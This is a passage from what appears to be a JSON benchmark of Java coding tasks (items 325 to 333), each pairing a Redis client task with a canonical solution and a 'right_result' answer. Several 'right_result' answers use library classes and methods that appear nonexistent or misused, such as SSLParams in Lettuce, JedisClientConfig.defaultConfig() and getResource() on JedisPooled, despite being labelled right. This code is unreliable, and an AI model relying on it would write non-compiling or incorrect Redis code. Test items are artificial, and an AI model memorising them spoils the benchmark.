(client != null) {\n            client.shutdown(Duration.of(10, TimeUnit.SECONDS));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 325,
    "Instruction": "Task Description: Create a Java class that implements a Redis client using connection pooling to perform high-throughput operations in a multi-threaded environment.\n\nClass Description: The RedisPooledClient class provides a thread-safe interface to interact with Redis using a pooled connection. It supports basic CRUD operations and is designed to handle concurrent requests efficiently.\n\nAttributes:\n- jedisPool: JedisPooled - The pooled Redis connection instance that manages connections to the Redis server\n\nMethods:\n- RedisPooledClient(String host, int port, String password) -> void - Constructor that initializes the Redis connection pool with the specified host, port, and password\n- performOperations(int totalOperations) -> void - Executes a specified number of set/get operations across multiple threads to demonstrate concurrent Redis access\n- close() -> void - Properly closes the Redis connection pool to release resources",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisPooledClient {\n\n    private JedisPooled jedisPool;\n\n    public RedisPooledClient(String host, int port, String password) {\n        this.jedisPool = new JedisPooled(host, port, null, password);\n    }\n\n    public void performOperations(int totalOperations) {\n        List<Thread> threads = new ArrayList<>();\n        AtomicInteger counter = new AtomicInteger();\n\n        for (int i = 0; i < 50; i++) {\n            Thread thread = new Thread(() -> {\n                for (int j = 0; (j = counter.getAndIncrement()) < totalOperations;) {\n                    try {\n                        String key = \"foo\" + j;\n                        jedisPool.set(key, key);\n                        jedisPool.get(key);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            });\n            threads.add(thread);\n            thread.start();\n        }\n\n        for (Thread t : threads) {\n            try {\n                t.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        jedisPool.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPooled;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisPooledClient {\n    private final JedisPooled jedisPool;\n\n    public RedisPooledClient(String host, int port, String password) {\n        this.jedisPool = new JedisPooled(host, port);\n        if (password != null && !password.isEmpty()) {\n            try (Jedis jedis = jedisPool.getResource()) {\n                jedis.auth(password);\n            }\n        }\n    }\n\n    public void performOperations(int totalOperations) {\n        int threadCount = Runtime.getRuntime().availableProcessors();\n        ExecutorService executor = Executors.newFixedThreadPool(threadCount);\n\n        for (int i = 0; i < totalOperations; i++) {\n            final int opId = i;\n            executor.submit(() -> {\n                try (Jedis jedis = jedisPool.getResource()) {\n                    String key = \"key_\" + opId;\n                    String value = \"value_\" + opId;\n                    jedis.set(key, value);\n                    String retrievedValue = jedis.get(key);\n                    assert retrievedValue.equals(value);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n        }\n\n        executor.shutdown();\n        try {\n            executor.awaitTermination(1, TimeUnit.MINUTES);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 326,
    "Instruction": "Task Description: Create a Redis connection manager class in Java that handles connection pooling and basic Redis operations using the Jedis client library.\n\nClass Description: The RedisConnectionManager class provides a convenient way to manage Redis connections using a connection pool and execute common Redis commands. It handles connection lifecycle and resource management.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool instance that manages Redis connections\n\nMethods:\n- RedisConnectionManager(String host, int port, String username, String password) -> void - Constructor that initializes the Redis connection pool with the specified connection parameters\n- executeCommand(RedisCommand command) -> void - Executes the specified Redis command (SET, GET, or INCR) using a connection from the pool and stores the result in the command object for GET operations\n- close() -> void - Closes the connection pool and releases all resources\n- isClosed() -> boolean - Checks if the connection pool is closed",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.exceptions.JedisException;\n\npublic class RedisConnectionManager {\n\n    private JedisPool jedisPool;\n\n    public RedisConnectionManager(String host, int port, String username, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, username, password);\n    }\n\n    public void executeCommand(RedisCommand command) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            switch (command.getOperation()) {\n                case \"SET\":\n                    jedis.set(command.getKey(), command.getValue());\n                    break;\n                case \"GET\":\n                    String result = jedis.get(command.getKey());\n                    command.setResult(result);\n                    break;\n                case \"INCR\":\n                    jedis.incr(command.getKey());\n                    break;\n                default:\n                    throw new JedisException(\"Unsupported operation: \" + command.getOperation());\n            }\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null && !jedisPool.isClosed()) {\n            jedisPool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return jedisPool == null || jedisPool.isClosed();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisConnectionManager {\n    private final JedisPool jedisPool;\n    private boolean isClosed = false;\n\n    public RedisConnectionManager(String host, int port, String username, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, 2000, username, password);\n    }\n\n    public void executeCommand(RedisCommand command) {\n        if (isClosed) {\n            throw new IllegalStateException(\"Connection pool is closed.\");\n        }\n\n        try (Jedis jedis = jedisPool.getResource()) {\n            switch (command.getOperation()) {\n                case \"SET\":\n                    jedis.set(command.getKey(), command.getValue());\n                    break;\n                case \"GET\":\n                    String result = jedis.get(command.getKey());\n                    command.setResult(result);\n                    break;\n                case \"INCR\":\n                    Long incrementedValue = jedis.incr(command.getKey());\n                    command.setIncrementResult(incrementedValue);\n                    break;\n                default:\n                    throw new IllegalArgumentException(\"Unsupported Redis operation: \" + command.getOperation());\n            }\n        }\n    }\n\n    public void close() {\n        if (!isClosed) {\n            jedisPool.close();\n            isClosed = true;\n        }\n    }\n\n    public boolean isClosed() {\n        return isClosed;\n    }\n}\n```"
  },
  {
    "Task_id": 327,
    "Instruction": "Task Description: Create a Java class that establishes a secure SSL/TLS connection to a Redis server using Lettuce client library, with support for SNI (Server Name Indication) and custom truststore configuration.\n\nClass Description: The RedisSSLConnection class provides a secure way to connect to a Redis server using SSL/TLS encryption. It handles SSL configuration including truststore setup and SNI support, and manages the Redis client lifecycle.\n\nAttributes:\n- redisClient: RedisClient - The underlying Redis client instance\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n\nMethods:\n- RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) -> void - Constructor that initializes the Redis client with SSL configuration\n  - redisUri: String - Redis server URI (e.g., \"rediss://host:port\")\n  - hostName: String - The hostname for SNI\n  - truststorePath: String - Path to the truststore file\n  - truststorePassword: String - Password for the truststore\n- getConnection() -> StatefulRedisConnection<String, String> - Returns the established Redis connection\n- close() -> void - Closes the connection and shuts down the Redis client",
    "Canonical_solution": "import io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.SslOptions;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport javax.net.ssl.SNIHostName;\nimport javax.net.ssl.SNIServerName;\nimport javax.net.ssl.SSLParameters;\nimport java.io.File;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class RedisSSLConnection {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) {\n        this.redisClient = RedisClient.create(redisUri);\n\n        List<SNIServerName> serverNames = new ArrayList<>();\n        serverNames.add(new SNIHostName(hostName));\n        \n        SslOptions sslOptions = SslOptions.builder()\n                .jdkSslProvider()\n                .truststore(new File(truststorePath), truststorePassword)\n                .sslParameters(() -> {\n                    SSLParameters parameters = new SSLParameters();\n                    parameters.setServerNames(serverNames);\n                    return parameters;\n                }).build();\n\n        ClientOptions clientOptions = ClientOptions.builder()\n                .sslOptions(sslOptions)\n                .build();\n        \n        redisClient.setOptions(clientOptions);\n        this.connection = redisClient.connect();\n    }\n\n    public StatefulRedisConnection<String, String> getConnection() {\n        return this.connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.protocol.RedisURI;\nimport io.lettuce.core.ssl.SSLParams;\n\nimport javax.net.ssl.*;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.security.KeyStore;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class RedisSSLConnection {\n    private final RedisClient redisClient;\n    private final StatefulRedisConnection<String, String> connection;\n\n    public RedisSSLConnection(String redisUri, String hostName, String truststorePath, String truststorePassword) throws Exception {\n        RedisURI redisURI = RedisURI.create(redisUri);\n        SSLContext sslContext = createSSLContext(truststorePath, truststorePassword);\n\n        List<String> sniHosts = new ArrayList<>();\n        sniHosts.add(hostName);\n        SSLParams sslParams = SSLParams.builder()\n                .sslContext(sslContext)\n                .sniHostNames(sniHosts)\n                .build();\n\n        redisClient = RedisClient.create(redisURI).setOptions(sslParams);\n        connection = redisClient.connect();\n    }\n\n    public StatefulRedisConnection<String, String> getConnection() {\n        return connection;\n    }\n\n    public void close() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    private SSLContext createSSLContext(String truststorePath, String truststorePassword) throws Exception {\n        KeyStore trustStore = KeyStore.getInstance(\"JKS\");\n        try (FileInputStream fis = new FileInputStream(new File(truststorePath))) {\n            trustStore.load(fis, truststorePassword.toCharArray());\n        }\n\n        TrustManagerFactory tmf = TrustManagerFactory\n                .getInstance(TrustManagerFactory.getDefaultAlgorithm());\n        tmf.init(trustStore);\n\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, tmf.getTrustManagers(), null);\n\n        return sslContext;\n    }\n}\n```"
  },
  {
    "Task_id": 328,
    "Instruction": "Task Description: Create a Java class that manages a pool of Redis connections using Jedis, allowing concurrent operations on Redis with connection pooling for efficient resource utilization.\n\nClass Description: RedisConnectionPool is a utility class that manages a pool of Redis connections. It provides thread-safe access to Redis operations and handles connection lifecycle management.\n\nAttributes:\n- pool: JedisPool - The connection pool instance managing Redis connections\n- endpoint: EndpointConfig - Configuration object containing Redis connection details (host, port, password)\n\nMethods:\n- RedisConnectionPool(EndpointConfig endpoint) -> void - Constructor that initializes the Redis connection pool with the given endpoint configuration\n- executeOperations(int totalOperations) -> void - Executes a specified number of Redis SET/GET operations across multiple threads (50 threads by default)\n- close() -> void - Properly shuts down the connection pool and releases all resources",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisConnectionPool {\n\n    private JedisPool pool;\n    private EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        this.pool = new JedisPool(new GenericObjectPoolConfig<Jedis>(), \n            endpoint.getHost(), endpoint.getPort(), 2000, endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        AtomicInteger ind = new AtomicInteger();\n        for (int i = 0; i < 50; i++) {\n            new Thread(() -> {\n                for (int j = 0; (j = ind.getAndIncrement()) < totalOperations;) {\n                    try (Jedis jedis = pool.getResource()) {\n                        String key = \"foo\" + j;\n                        jedis.set(key, key);\n                        jedis.get(key);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            }).start();\n        }\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisConnectionPool {\n    private final JedisPool pool;\n    private final EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        poolConfig.setMaxTotal(100);\n        poolConfig.setMaxIdle(50);\n        poolConfig.setMinIdle(10);\n        poolConfig.setTestOnBorrow(true);\n        poolConfig.setTestOnReturn(true);\n        this.pool = new JedisPool(poolConfig, endpoint.getHost(), endpoint.getPort(), 2000, endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        int threadCount = 50;\n        ExecutorService executor = Executors.newFixedThreadPool(threadCount);\n\n        for (int i = 0; i < totalOperations; i++) {\n            executor.submit(() -> {\n                try (Jedis jedis = pool.getResource()) {\n                    String key = \"key_\" + System.currentTimeMillis();\n                    String value = \"value_\" + Thread.currentThread().getId();\n                    jedis.set(key, value);\n                    String result = jedis.get(key);\n                    if (!result.equals(value)) {\n                        throw new RuntimeException(\"Redis SET/GET operation failed.\");\n                    }\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            });\n        }\n\n        executor.shutdown();\n        try {\n            executor.awaitTermination(1, TimeUnit.MINUTES);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 329,
    "Instruction": "Task Description: Create a Java class that provides basic Redis interaction capabilities using the Lettuce client library, including connection management and key-value operations.\n\nClass Description: The RedisInteraction class encapsulates Redis connection and basic operations, providing methods to set/get values and manage the connection lifecycle.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used to create connections\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n- syncCommands: RedisCommands<String, String> - Synchronous command interface for Redis operations\n\nMethods:\n- RedisInteraction(String redisUri) -> void - Constructor that initializes the Redis client and establishes a connection using the provided URI\n- setValue(String key, String value) -> void - Stores a key-value pair in Redis\n- getValue(String key) -> String - Retrieves the value associated with the given key from Redis\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisInteraction {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(RedisURI.create(redisUri));\n        this.connection = redisClient.connect();\n        this.syncCommands = connection.sync();\n    }\n\n    public void setValue(String key, String value) {\n        syncCommands.set(key, value);\n    }\n\n    public String getValue(String key) {\n        return syncCommands.get(key);\n    }\n\n    public void closeConnection() {\n        connection.close();\n        redisClient.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisInteraction {\n    private final RedisClient redisClient;\n    private final StatefulRedisConnection<String, String> connection;\n    private final RedisCommands<String, String> syncCommands;\n\n    public RedisInteraction(String redisUri) {\n        redisClient = RedisClient.create(redisUri);\n        connection = redisClient.connect();\n        syncCommands = connection.sync();\n    }\n\n    public void setValue(String key, String value) {\n        syncCommands.set(key, value);\n    }\n\n    public String getValue(String key) {\n        return syncCommands.get(key);\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 332,
    "Instruction": "Task Description: Create a Java class that provides a wrapper for JedisSentinelPool to simplify Redis Sentinel connection management in Java applications.\n\nClass Description: JedisSentinelPoolWrapper is a utility class that encapsulates the functionality of JedisSentinelPool, providing methods for pool initialization, resource acquisition, and connection cleanup. It handles Redis Sentinel connections with configurable pool settings and client configurations.\n\nAttributes:\n- masterName: String - The name of the Redis master node in the Sentinel configuration\n- sentinels: Set<HostAndPort> - Set of Sentinel server addresses (host and port)\n- poolConfig: GenericObjectPoolConfig<Jedis> - Configuration for the connection pool\n- masterConfig: JedisClientConfig - Configuration for connections to the master node\n- sentinelConfig: JedisClientConfig - Configuration for connections to Sentinel nodes\n- pool: JedisSentinelPool - The underlying Jedis Sentinel connection pool instance\n\nMethods:\n- initializePool(): void - Initializes the JedisSentinelPool with the configured parameters\n- getResource(): Jedis - Retrieves a Jedis resource from the pool (throws JedisConnectionException if pool not initialized)\n- close(): void - Closes the pool if it's open\n- isClosed(): boolean - Returns whether the pool is closed\n- destroy(): void - Destroys the pool and all its resources\n- toStrings(Set<HostAndPort>): Set<String> - Static helper method to convert HostAndPort objects to strings",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.Set;\nimport java.util.stream.Collectors;\n\npublic class JedisSentinelPoolWrapper {\n\n    private final String masterName;\n    private final Set<HostAndPort> sentinels;\n    private final GenericObjectPoolConfig<Jedis> poolConfig;\n    private final JedisClientConfig masterConfig;\n    private final JedisClientConfig sentinelConfig;\n    private JedisSentinelPool pool;\n\n    public JedisSentinelPoolWrapper(String masterName, Set<HostAndPort> sentinels,\n                                  GenericObjectPoolConfig<Jedis> poolConfig,\n                                  JedisClientConfig masterConfig,\n                                  JedisClientConfig sentinelConfig) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.poolConfig = poolConfig;\n        this.masterConfig = masterConfig;\n        this.sentinelConfig = sentinelConfig;\n    }\n\n    public void initializePool() {\n        this.pool = new JedisSentinelPool(masterName, sentinels, poolConfig, masterConfig, sentinelConfig);\n    }\n\n    public Jedis getResource() throws JedisConnectionException {\n        if (pool == null) {\n            throw new JedisConnectionException(\"Pool not initialized\");\n        }\n        return pool.getResource();\n    }\n\n    public void close() {\n        if (pool != null && !pool.isClosed()) {\n            pool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return pool == null || pool.isClosed();\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n\n    private static Set<String> toStrings(Set<HostAndPort> hostAndPorts) {\n        return hostAndPorts.stream().map(HostAndPort::toString).collect(Collectors.toSet());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisSentinelPool;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.util.GenericObjectPoolConfig;\n\nimport java.util.Set;\n\npublic class JedisSentinelPoolWrapper {\n    private String masterName;\n    private Set<HostAndPort> sentinels;\n    private GenericObjectPoolConfig<Jedis> poolConfig;\n    private JedisClientConfig masterConfig;\n    private JedisClientConfig sentinelConfig;\n    private JedisSentinelPool pool;\n\n    public JedisSentinelPoolWrapper(String masterName, Set<HostAndPort> sentinels) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.poolConfig = new GenericObjectPoolConfig<>();\n        this.masterConfig = JedisClientConfig.defaultConfig();\n        this.sentinelConfig = JedisClientConfig.defaultConfig();\n    }\n\n    public void initializePool() {\n        pool = new JedisSentinelPool(masterName, sentinels, poolConfig, masterConfig, sentinelConfig);\n    }\n\n    public Jedis getResource() {\n        if (pool == null || pool.isClosed()) {\n            throw new JedisConnectionException(\"Pool has not been initialized or is closed.\");\n        }\n        return pool.getResource();\n    }\n\n    public void close() {\n        if (pool != null && !pool.isClosed()) {\n            pool.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return pool == null || pool.isClosed();\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n\n    public static Set<String> toStrings(Set<HostAndPort> hostAndPorts) {\n        return hostAndPorts.stream()\n                .map(hp -> hp.getHost() + \":\" + hp.getPort())\n                .collect(java.util.stream.Collectors.toSet());\n    }\n}\n```"
  },
  {
    "Task_id": 333,
    "Instruction": "Task Description: Create a Java class that implements a Redis Sentinel connection pool for managing connections to a Redis master server, with automatic failover handling when the master changes.\n\nClass Description: JedisSentinelPool is a connection pool implementation that maintains connections to a Redis master server discovered through Redis Sentinel. It automatically handles master failover by monitoring Sentinel notifications and reconfiguring the connection pool when the master changes.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- factory: JedisFactory - Factory for creating Jedis instances\n- sentinelClientConfig: JedisClientConfig - Configuration for connecting to Sentinels\n- masterListeners: Collection<MasterListener> - Collection of threads monitoring Sentinel servers\n- currentHostMaster: HostAndPort - Current master server address (volatile)\n- initPoolLock: Lock - Lock for thread-safe pool initialization\n\nMethods:\n- JedisSentinelPool(String, Set<HostAndPort>, JedisFactory, JedisClientConfig) -> void - Constructor that initializes the Sentinel pool with master name, Sentinel addresses, factory, and client config\n- initMaster(HostAndPort) -> void - Initializes or updates the master connection pool\n- initSentinels(Set<HostAndPort>, String) -> HostAndPort - Discovers the current master from Sentinels and starts listeners\n- toHostAndPort(List<String>) -> HostAndPort - Converts Sentinel response to HostAndPort object\n- getResource() -> Jedis - Gets a Jedis resource from the pool (overrides parent method)\n- returnResource(Jedis) -> void - Returns a Jedis resource to the pool (overrides parent method)\n\nNested Class MasterListener:\n- masterName: String - Name of the monitored master\n- host: String - Sentinel host address\n- port: int - Sentinel port number\n- subscribeRetryWaitTimeMillis: long - Retry wait time for subscription\n- j: Jedis - Jedis instance for Sentinel connection\n- running: AtomicBoolean - Flag controlling listener thread\n\nMasterListener Methods:\n- MasterListener(String, String, int) -> void - Constructor for Sentinel listener\n- run() -> void - Main listener thread that monitors Sentinel for master changes\n- shutdown() -> void - Gracefully shuts down the listener thread",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.stream.Collectors;\n\npublic class JedisSentinelPool extends Pool<Jedis> {\n\n  private static final Logger LOG = LoggerFactory.getLogger(JedisSentinelPool.class);\n  private final JedisFactory factory;\n  private final JedisClientConfig sentinelClientConfig;\n  protected final Collection<MasterListener> masterListeners = new ArrayList<>();\n  private volatile HostAndPort currentHostMaster;\n  private final Lock initPoolLock = new ReentrantLock(true);\n\n  public JedisSentinelPool(String masterName, Set<HostAndPort> sentinels,\n      final JedisFactory factory, final JedisClientConfig sentinelClientConfig) {\n    super(factory);\n    this.factory = factory;\n    this.sentinelClientConfig = sentinelClientConfig;\n    HostAndPort master = initSentinels(sentinels, masterName);\n    initMaster(master);\n  }\n\n  private void initMaster(HostAndPort master) {\n    initPoolLock.lock();\n    try {\n      if (!master.equals(currentHostMaster)) {\n        currentHostMaster = master;\n        factory.setHostAndPort(currentHostMaster);\n        super.clear();\n        LOG.info(\"Created JedisSentinelPool to master at {}\", master);\n      }\n    } finally {\n      initPoolLock.unlock();\n    }\n  }\n\n  private HostAndPort initSentinels(Set<HostAndPort> sentinels, final String masterName) {\n    HostAndPort master = null;\n    boolean sentinelAvailable = false;\n    LOG.info(\"Trying to find master from available Sentinels...\");\n\n    for (HostAndPort sentinel : sentinels) {\n      LOG.debug(\"Connecting to Sentinel {}\", sentinel);\n      try (Jedis jedis = new Jedis(sentinel, sentinelClientConfig)) {\n        List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n        sentinelAvailable = true;\n        if (masterAddr == null || masterAddr.size() != 2) {\n          LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}\", masterName, sentinel);\n          continue;\n        }\n        master = toHostAndPort(masterAddr);\n        LOG.debug(\"Found Redis master at {}\", master);\n        break;\n      } catch (JedisException e) {\n        LOG.warn(\"Cannot get master address from sentinel running @ {}. Reason: {}. Trying next one.\", sentinel, e);\n      }\n    }\n\n    if (master == null) {\n      if (sentinelAvailable) {\n        throw new JedisException(\"Can connect to sentinel, but \" + masterName + \" seems to be not monitored...\");\n      } else {\n        throw new JedisConnectionException(\"All sentinels down, cannot determine where is \" + masterName + \" master is running...\");\n      }\n    }\n\n    LOG.info(\"Redis master running at {}, starting Sentinel listeners...\", master);\n    for (HostAndPort sentinel : sentinels) {\n      MasterListener masterListener = new MasterListener(masterName, sentinel.getHost(), sentinel.getPort());\n      masterListener.setDaemon(true);\n      masterListeners.add(masterListener);\n      masterListener.start();\n    }\n    return master;\n  }\n\n  private HostAndPort toHostAndPort(List<String> getMasterAddrByNameResult) {\n    String host = getMasterAddrByNameResult.get(0);\n    int port = Integer.parseInt(getMasterAddrByNameResult.get(1));\n    return new HostAndPort(host, port);\n  }\n\n  @Override\n  public Jedis getResource() {\n    while (true) {\n      Jedis jedis = super.getResource();\n      jedis.setDataSource(this);\n      final HostAndPort master = currentHostMaster;\n      final HostAndPort connection = jedis.getClient().getHostAndPort();\n      if (master.equals(connection)) {\n        return jedis;\n      } else {\n        returnBrokenResource(jedis);\n      }\n    }\n  }\n\n  @Override\n  public void returnResource(final Jedis resource) {\n    if (resource != null) {\n      try {\n        resource.resetState();\n        super.returnResource(resource);\n      } catch (RuntimeException e) {\n        returnBrokenResource(resource);\n        LOG.debug(\"Resource is returned to the pool as broken\", e);\n      }\n    }\n  }\n\n  protected class MasterListener extends Thread {\n    protected String masterName;\n    protected String host;\n    protected int port;\n    protected long subscribeRetryWaitTimeMillis = 5000;\n    protected volatile Jedis j;\n    protected AtomicBoolean running = new AtomicBoolean(false);\n\n    public MasterListener(String masterName, String host, int port) {\n      super(String.format(\"MasterListener-%s-[%s:%d]\", masterName, host, port));\n      this.masterName = masterName;\n      this.host = host;\n      this.port = port;\n    }\n\n    @Override\n    public void run() {\n      running.set(true);\n      while (running.get()) {\n        try {\n          if (!running.get()) break;\n          final HostAndPort hostPort = new HostAndPort(host, port);\n          j = new Jedis(hostPort, sentinelClientConfig);\n          List<String> masterAddr = j.sentinelGetMasterAddrByName(masterName);\n          if (masterAddr == null || masterAddr.size() != 2) {\n            LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}.\", masterName, hostPort);\n          } else {\n            initMaster(toHostAndPort(masterAddr));\n          }\n          j.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n              LOG.debug(\"Sentinel {} published: {}.\", hostPort, message);\n              String[] switchMasterMsg = message.split(\" \");\n              if (switchMasterMsg.length > 3) {\n                if (masterName.equals(switchMasterMsg[0])) {\n                  initMaster(toHostAndPort(Arrays.asList(switchMasterMsg[3], switchMasterMsg[4])));\n                } else {\n                  LOG.debug(\"Ignoring message on +switch-master for master name {}, our master name is {}\",\n                      switchMasterMsg[0], masterName);\n                }\n              } else {\n                LOG.error(\"Invalid message received on Sentinel {} on channel +switch-master: {}\",\n                    hostPort, message);\n              }\n            }\n          }, \"+switch-master\");\n        } catch (JedisException e) {\n          if (running.get()) {\n            LOG.error(\"Lost connection to Sentinel at {}:{}. Sleeping 5000ms and retrying.\", host, port, e);\n            try {\n              Thread.sleep(subscribeRetryWaitTimeMillis);\n            } catch (InterruptedException e1) {\n              LOG.error(\"Sleep interrupted: \", e1);\n            }\n          } else {\n            LOG.debug(\"Unsubscribing from Sentinel at {}:{}\", host, port);\n          }\n        } finally {\n          if (j != null) {\n            j.close();\n          }\n        }\n      }\n    }\n\n    public void shutdown() {\n      try {\n        LOG.debug(\"Shutting down listener on {}:{}\", host, port);\n        running.set(false);\n        if (j != null) {\n          j.close();\n        }\n      } catch (RuntimeException e) {\n        LOG.error(\"Caught exception while shutting down: \", e);\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisFactory;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.util.Pool;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Collection;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.*;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class JedisSentinelPool extends Pool<Jedis> {\n    private static final Logger LOG = LoggerFactory.getLogger(JedisSentinelPool.class);\n    protected final JedisFactory factory;\n    protected final JedisClientConfig sentinelClientConfig;\n    protected volatile HostAndPort currentHostMaster;\n    protected final Set<HostAndPort> sentinels;\n    protected final String masterName;\n    protected final Lock initPoolLock = new ReentrantLock();\n    protected Collection<MasterListener> masterListeners = new HashSet<>();\n\n    public JedisSentinelPool(String masterName, Set<HostAndPort> sentinels, JedisFactory factory, JedisClientConfig sentinelClientConfig) {\n        this.masterName = masterName;\n        this.sentinels = sentinels;\n        this.factory = factory;\n        this.sentinelClientConfig = sentinelClientConfig;\n        try {\n            initPool();\n        } catch (Exception e) 